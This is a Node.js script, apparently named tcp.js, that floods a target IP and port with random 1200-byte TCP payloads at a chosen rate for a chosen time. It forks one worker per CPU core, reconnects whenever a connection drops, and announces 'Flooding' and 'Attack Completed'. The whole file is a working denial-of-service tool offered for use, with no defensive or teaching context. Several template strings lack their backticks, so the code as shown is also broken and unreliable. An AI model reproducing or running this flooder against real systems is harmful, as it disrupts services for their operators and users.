const net = require('net');
const cluster = require('cluster');
const { v4: uuidv4 } = require('uuid');

const payloadSize = 1200;

if (process.argv.length < 5) {
  console.log('Usage: node tcp.js <IP> <TCP Port> <Packets per Second> <Time in Seconds>');
  process.exit(-1);
}

const ip = process.argv[2];
const tcpPort = process.argv[3];
const packetsPerSecond = parseInt(process.argv[4]);
const timeInSeconds = parseInt(process.argv[5]);

console.log(
Flooding TCP server with ${packetsPerSecond} packets per second, for ${timeInSeconds} seconds);

if (cluster.isMaster) {
  for (let i = 0; i < require('os').cpus().length; i++) {
    cluster.fork();
  }
} else {
  const delay = Math.floor(1000 / packetsPerSecond);
  const startTime = Date.now();

  const sendPacket = (tcpConn) => {
    const payload = generateRandomPayload(payloadSize);

    tcpConn.write(payload, (err) => {
      if (err) {
        console.error(Failed to send payload: ${err});
        return;
      }
    });
  };

  const connectToServer = () => {
    const tcpConn = net.connect(tcpPort, ip, () => {
      console.log('Connected to TCP server');
      const interval = setInterval(() => sendPacket(tcpConn), delay);

      setTimeout(() => {
        clearInterval(interval);
        tcpConn.end();
        console.log('Attack Completed');
        process.exit(0);
      }, timeInSeconds * 1000);
    });

    tcpConn.on('error', (err) => {
      console.error(Failed to connect to TCP server: ${err});
    });

    tcpConn.on('close', () => {
      console.log('TCP connection closed');
      connectToServer();
    });
  };

  connectToServer();
}

function generateRandomPayload(size) {
  const payload = Buffer.alloc(size);
  for (let i = 0; i < size; i++) {
    payload[i] = Math.floor(Math.random() * 256);
  }
  return payload;
}